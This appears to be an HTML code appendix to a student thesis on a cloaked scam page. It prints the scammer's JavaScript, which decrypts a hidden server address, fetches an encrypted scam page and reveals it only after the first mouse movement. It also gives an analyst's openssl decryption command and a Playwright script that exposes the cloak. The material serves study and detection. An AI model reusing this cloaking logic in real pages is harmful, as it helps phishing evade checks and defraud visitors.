@@ -1,0 +1,186 @@
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="theme-color" content="#0b0f1a">
+<meta name="robots" content="noindex,nofollow">
+<title>Appendix — The Code, in Plain English</title>
+<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Ctext y='.9em' font-size='90'%3E%F0%9F%93%8E%3C/text%3E%3C/svg%3E">
+<style>
+  :root{
+    --bg:#0b0f1a; --bg2:#111726; --card:#151d30; --line:#243049;
+    --ink:#e8ecf6; --muted:#9aa7c4; --faint:#66738f;
+    --violet:#8b5cf6; --violet2:#a78bfa;
+    --green:#22c39a; --greenbg:#0f2620; --greenline:#1f4d3f;
+    --amber:#f6b73c; --amberbg:#2a2410; --amberline:#5a4d1f;
+    --red:#f2555a; --redbg:#2a1418; --redline:#5a2530;
+    --mono:ui-monospace,"SF Mono",Menlo,Consolas,monospace;
+    --sans:system-ui,-apple-system,"Segoe UI",Roboto,sans-serif;
+  }
+  *{box-sizing:border-box}
+  body{margin:0;background:radial-gradient(1100px 650px at 82% -8%,#17213c 0,transparent 58%),var(--bg);
+       color:var(--ink);font-family:var(--sans);line-height:1.7;-webkit-font-smoothing:antialiased}
+  a{color:var(--violet2);text-decoration:none} a:hover{text-decoration:underline}
+  .wrap{max-width:780px;margin:0 auto;padding:0 24px}
+  nav.top{position:sticky;top:0;z-index:60;backdrop-filter:blur(12px);background:rgba(11,15,26,.85);border-bottom:1px solid var(--line)}
+  nav.top .wrap{display:flex;gap:10px;align-items:center;height:56px;overflow-x:auto}
+  nav.top .brand{font-weight:800;white-space:nowrap} nav.top .brand .dot{color:var(--violet2)}
+  nav.top .spacer{margin-left:auto}
+  nav.top a.btn,nav.top button.btn{color:var(--muted);font-size:.82rem;padding:7px 12px;border-radius:9px;border:1px solid var(--line);white-space:nowrap;background:transparent;cursor:pointer;font-family:var(--sans)}
+  nav.top a.btn:hover,nav.top button.btn:hover{color:var(--ink);background:var(--bg2);border-color:var(--violet);text-decoration:none}
+  nav.top button.print{color:var(--violet2);border-color:rgba(139,92,246,.5)}
+
+  .cover{padding:50px 0 22px;border-bottom:1px solid var(--line)}
+  .doctype{font-size:.72rem;font-weight:700;letter-spacing:.16em;text-transform:uppercase;color:var(--violet2)}
+  h1{font-size:clamp(1.6rem,4.5vw,2.2rem);line-height:1.18;margin:12px 0 8px;letter-spacing:-.02em}
+  .subtitle{color:var(--muted);font-size:1.04rem;max-width:640px}
+
+  section{padding:28px 0;border-top:1px solid var(--line)}
+  h2{font-size:1.25rem;margin:0 0 6px}
+  h2 .tag{font-family:var(--mono);color:var(--violet2);font-size:.9rem;margin-right:8px}
+  p{color:var(--ink)} .sub{color:var(--muted)} b,strong{color:#fff}
+
+  .evi{display:inline-block;font-size:.7rem;font-weight:700;letter-spacing:.08em;text-transform:uppercase;padding:3px 9px;border-radius:6px;margin-bottom:8px}
+  .evi.red{color:var(--red);background:var(--redbg);border:1px solid var(--redline)}
+  .evi.grn{color:var(--green);background:var(--greenbg);border:1px solid var(--greenline)}
+
+  pre{background:#0a0e18;border:1px solid var(--line);border-radius:12px;padding:15px 16px;overflow-x:auto;
+    font-family:var(--mono);font-size:.82rem;line-height:1.6;color:#cdd6ea}
+  pre .c{color:var(--faint)} pre .k{color:var(--violet2)} pre .s{color:var(--green)} pre .f{color:#7cc7ff}
+
+  .plain{border:1px solid var(--greenline);border-radius:12px;background:var(--greenbg);padding:14px 16px;margin:12px 0}
+  .plain .t{font-size:.7rem;letter-spacing:.1em;text-transform:uppercase;color:var(--green);font-weight:700;margin-bottom:6px}
+  .plain ol{margin:.3em 0;padding-left:20px} .plain ol li{margin:5px 0;color:var(--muted)} .plain ol li b{color:var(--ink)}
+  .plain ol li::marker{color:var(--green);font-weight:700}
+
+  .note{border:1px solid var(--amberline);background:var(--amberbg);border-radius:12px;padding:14px 16px;margin:14px 0;font-size:.92rem}
+  .note b{color:var(--amber)}
+  .cut{border:1px solid var(--redline);background:var(--redbg);border-radius:12px;padding:14px 16px;margin:14px 0;font-size:.92rem}
+  .cut b{color:var(--red)}
+
+  .watermark{margin:28px 0 8px;text-align:center}
+  .stamp{display:inline-block;transform:rotate(-1.5deg);border:2px solid var(--amber);border-radius:12px;padding:14px 24px;background:rgba(246,183,60,.06)}
+  .stamp .big{font-size:.9rem;font-weight:800;letter-spacing:.14em;text-transform:uppercase;color:var(--amber)}
+  .stamp .small{margin-top:6px;font-size:.8rem;color:var(--muted);max-width:520px}
+  .stamp .small b{color:var(--ink)}
+  footer{padding:24px 0 60px;border-top:1px solid var(--line);color:var(--faint);font-size:.84rem}
+
+  @media print{
+    nav.top{display:none !important}
+    body{background:#fff !important;color:#111 !important}
+    .wrap{max-width:100%}
+    h1,h2,h3,b,strong,.subtitle,p{color:#111 !important}
+    a{color:#0645ad !important}
+    section,.cover{border-color:#bbb !important}
+    pre{background:#f4f4f4 !important;color:#111 !important;border-color:#bbb !important}
+    pre .c{color:#666 !important} pre .k{color:#5b21b6 !important} pre .s{color:#166534 !important} pre .f{color:#075985 !important}
+    .plain{background:#eef7f1 !important;border-color:#bbb !important} .plain ol li{color:#222 !important}
+    .note,.cut{background:#f6f6f6 !important;border-color:#bbb !important;color:#222 !important}
+    .stamp{border-color:#333 !important;background:#f7f2e2 !important} .stamp .big{color:#111 !important} .stamp .small{color:#333 !important}
+    section{page-break-inside:avoid}
+  }
+</style>
+
+<nav class="top"><div class="wrap">
+  <span class="brand">📎 Code<span class="dot">·</span>Appendix</span>
+  <span class="spacer"></span>
+  <button class="btn print" onclick="window.print()">🖨️ Print / Save PDF</button>
+  <a class="btn" href="./case-study.html">← Case study</a>
+  <a class="btn" href="./study.html">Study guide</a>
+</div></nav>
+
+<header class="cover"><div class="wrap">
+  <div class="doctype">Case Study · Appendix</div>
+  <h1>The code involved — explained in plain English</h1>
+  <p class="subtitle">The actual code pieces behind the case study. Each one is shown, then explained in simple words: what it is and what it does. No jargon.</p>
+  <div class="note" style="margin-top:18px">📌 <b>How to read this:</b> each block below shows some code, then a green "<b>What this does, in plain English</b>" box. You don't need to read the code itself — the plain box tells you everything.</div>
+</div></header>
+
+<section><div class="wrap">
+  <span class="evi red">Evidence · the scammer's code</span>
+  <h2><span class="tag">A</span>The hidden trigger</h2>
+  <p class="sub">This is the small piece of code found inside the innocent "shop" page — the part that quietly waits, then does the swap.</p>
+<pre><span class="c">// two passwords, sitting right there in the page:</span>
+<span class="k">const</span> PASSPHRASE = <span class="s">"98yNCjeAfWMwk0wI"</span>;   <span class="c">// unlocks the scam page</span>
+<span class="k">const</span> URL_KEY    = <span class="s">"UrLk3yShopEase01"</span>;   <span class="c">// unlocks the hidden server's address</span>
+<span class="k">const</span> ENC_DATA_ORIGIN = <span class="s">"U2FsdGVkX18Q…"</span>;    <span class="c">// the hidden address, kept scrambled</span>
+
+<span class="c">// unlock the hidden server's address using the first password:</span>
+<span class="k">const</span> DATA_ORIGIN = CryptoJS.AES.<span class="f">decrypt</span>(ENC_DATA_ORIGIN, URL_KEY)…;
+
+<span class="k">async function</span> <span class="f">loadSecret</span>() {
+  <span class="c">// 1. download the scrambled scam page from the hidden server</span>
+  <span class="k">const</span> res  = <span class="k">await</span> <span class="f">fetch</span>(DATA_ORIGIN + <span class="s">"/data?platform="</span> + <span class="f">detectPlatform</span>());
+  <span class="k">const</span> { cipher } = <span class="k">await</span> res.<span class="f">json</span>();
+  <span class="c">// 2. unlock it using the second password</span>
+  <span class="k">const</span> html = CryptoJS.AES.<span class="f">decrypt</span>(cipher, PASSPHRASE)…;
+  <span class="c">// 3. build the page in memory and show it, hide the shop</span>
+  frame.src = URL.<span class="f">createObjectURL</span>(<span class="k">new</span> Blob([html]));
+  shop.style.display  = <span class="s">"none"</span>;
+  frame.style.display = <span class="s">"block"</span>;
+}
+
+<span class="c">// THE TRIGGER: do nothing until the mouse moves once — then run it.</span>
+<span class="k">window</span>.<span class="f">addEventListener</span>(<span class="s">"mousemove"</span>, loadSecret, { once: <span class="k">true</span> });</pre>
+  <div class="plain"><div class="t">What this does, in plain English</div>
+    <ol>
+      <li>It keeps <b>two passwords</b> right inside the page (that's the scammers' mistake that let analysts crack it).</li>
+      <li>It uses the first password to <b>reveal the address of a hidden server</b> that was kept scrambled.</li>
+      <li>The <code>loadSecret</code> part is the swap: <b>download the scrambled scam page → unlock it with the second password → put it on the screen and hide the shop.</b></li>
+      <li>The very last line is the whole trick: <b>"wait for the mouse to move, then run the swap once."</b> A checking-robot never moves a mouse, so it never runs — but a real person triggers it instantly.</li>
+    </ol>
+  </div>
+</div></section>
+
+<section><div class="wrap">
+  <span class="evi grn">Analyst tool · attacking the attackers</span>
+  <h2><span class="tag">B</span>Unlocking the scrambled page</h2>
+  <p class="sub">This is a normal, free command an investigator runs to <b>un-scramble</b> the scam page — using the password the scammers carelessly left in their own code.</p>
+<pre><span class="c"># feed it the scrambled text + the password → get the original back</span>
+openssl enc -aes-256-cbc -d -a -md md5 -pass pass:<span class="s">98yNCjeAfWMwk0wI</span> -in scrambled.txt</pre>
+  <div class="plain"><div class="t">What this does, in plain English</div>
+    <ol>
+      <li>You give it the <b>scrambled gibberish</b> and the <b>password</b>.</li>
+      <li>It hands back the <b>original scam page</b> — readable again.</li>
+      <li>This is only possible <b>because the password was sitting in the page.</b> Real protection would keep that password hidden, and this command would fail.</li>
+    </ol>
+  </div>
+</div></section>
+
+<section><div class="wrap">
+  <span class="evi grn">Analyst tool · attacking the attackers</span>
+  <h2><span class="tag">C</span>Exposing the trap (pretending to be human)</h2>
+  <p class="sub">This is the "attacking the attackers" part: a short script that opens the page like a robot, then <b>fakes a mouse movement</b> to force the hidden scam to reveal itself — so it can be caught, screenshotted, and reported.</p>
+<pre><span class="k">with</span> sync_playwright() <span class="k">as</span> p:
+    browser = p.chromium.<span class="f">launch</span>()
+    page = browser.<span class="f">new_page</span>()
+    page.<span class="f">goto</span>(<span class="s">"https://the-suspect-page/…"</span>)          <span class="c"># 1. open the innocent-looking page</span>
+    page.<span class="f">screenshot</span>(path=<span class="s">"1_what_a_robot_sees.png"</span>)  <span class="c"># 2. capture the clean 'shop'</span>
+
+    page.mouse.<span class="f">move</span>(200, 200)                       <span class="c"># 3. FAKE a mouse movement (act human)</span>
+    page.<span class="f">wait_for_timeout</span>(3000)                     <span class="c"># 4. give it a moment to swap</span>
+    page.<span class="f">screenshot</span>(path=<span class="s">"2_what_a_human_sees.png"</span>)  <span class="c"># 5. the hidden scam is now exposed</span></pre>
+  <div class="plain"><div class="t">What this does, in plain English</div>
+    <ol>
+      <li>It opens the suspicious page automatically and <b>takes a photo</b> — this shows the harmless shop (what a robot sees).</li>
+      <li>Then it <b>pretends to move the mouse</b>, tricking the page's own trap into firing.</li>
+      <li>It <b>takes a second photo</b> — now showing the hidden scam. Side by side, the two photos <b>prove</b> the page is a cloak, which is exactly what you need to report it.</li>
+    </ol>
+  </div>
+</div></section>
+
+<section><div class="wrap">
+  <h2>What is deliberately left out — and why</h2>
+  <div class="cut">🚫 <b>This is not a working scam kit.</b> On purpose, the pieces that would let someone actually <i>run</i> this are <b>not</b> included here — the fake-shop page itself, the server that stores and hands out the scrambled scam, and the wiring that makes it auto-run. What's shown is only enough to <b>understand</b> the trick and to <b>detect</b> it. That's the whole point of the thesis: studying the attack in order to defend against it.</div>
+</div></section>
+
+<section><div class="wrap">
+  <div class="watermark">
+    <div class="stamp">
+      <div class="big">★ For Educational Study Only ★</div>
+      <div class="small">Project thesis: <b>“Attacking the Cyber-Attackers.”</b> Code shown as evidence and for defence only — not to build, run, or assist any scam, or to harm anyone.</div>
+    </div>
+  </div>
+</div></section>
+
+<footer><div class="wrap">
+  Code appendix to the <a href="./case-study.html">case study</a>. Companion pages: <a href="./study.html">study guide</a> · <a href="./index.html">visual teardown</a> · <a href="./crypto-sandbox.html">crypto sandbox</a>.
+</div></footer>
